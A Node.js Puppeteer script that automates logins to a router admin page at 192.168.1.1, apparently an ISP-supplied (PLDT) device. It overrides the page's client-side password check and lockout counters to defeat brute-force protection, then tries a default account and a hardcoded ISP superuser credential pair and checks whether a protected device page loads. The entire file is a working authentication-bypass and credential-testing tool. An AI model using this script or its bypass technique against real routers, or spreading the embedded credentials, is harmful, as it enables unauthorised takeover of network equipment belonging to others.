#!/usr/bin/env node
const PUPPETEER = require('puppeteer');
const ROUTER = 'https://192.168.1.1';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function test(user, pass) {
  const browser = await PUPPETEER.launch({
    headless: true, ignoreHTTPSErrors: true,
    args: ['--no-sandbox', '--ignore-certificate-errors'],
  });
  const page = await browser.newPage();
  page.setDefaultTimeout(30000);

  await page.goto(ROUTER + '/admin.html', { waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true });
  await sleep(2000);
  // Check lockout state
  const lockState = await page.evaluate(() => ({
    LockLeftTime: window.LockLeftTime,
    FailStat: window.FailStat,
    LoginTimes: window.LoginTimes,
    btnDisabled: document.getElementById('button')?.disabled,
  }));
  console.log(`Lock state: ${JSON.stringify(lockState)}`);

  // Full bypass from automation.js
  await page.evaluate((u, p) => {
    window.CheckPassword = () => 0;
    window.setDisable = () => {};
    window.DisplayWifiPldt = () => {};
    window.BandSteeringState = () => {};
    window.LockLeftTime = 0;
    window.FailStat = '0';
    window.LoginTimes = 0;
    window.preflag = 0;
    document.querySelector('input#txt_Username').value = u;
    document.querySelector('input#txt_Password').value = p;
    // Ensure button is enabled
    const btn = document.getElementById('button');
    if (btn) { btn.disabled = false; btn.style.display = ''; }
  }, user, pass);
  await sleep(500);
  await page.evaluate(() => document.getElementById('button').click());
  await sleep(5000);
  const loginUrl = page.url();
  console.log(`Login URL: ${loginUrl}`);

  await page.goto(ROUTER + '/html/bbsp/userdevinfo/userdevinfo.asp', {
    waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true
  });
  await sleep(1000);
  const hasLogin = await page.evaluate(() => !!document.querySelector('input#txt_Username'));
  const text = await page.evaluate(() => document.body.innerText.substring(0, 200));
  console.log(`Protected page has login form: ${hasLogin}`);
  console.log(`Page text: ${text.substring(0, 100)}`);
  console.log(`=> ${hasLogin ? '❌ FAILED' : '✅ SUCCESS'}`);

  await browser.close();
  return !hasLogin;
}

(async () => {
  console.log('=== Test 1: admin:Admin12345 ===');
  const r1 = await test('admin', 'Admin12345');
  console.log('');
  console.log('=== Test 2: adminpldt:AC2DIU7QW3ERTY6UPAS4DFG ===');
  const r2 = await test('adminpldt', 'AC2DIU7QW3ERTY6UPAS4DFG');
  console.log('');
  console.log(`admin: ${r1 ? '✅' : '❌'} | adminpldt: ${r2 ? '✅' : '❌'}`);
  process.exit(r1 ? 0 : 1);
})();
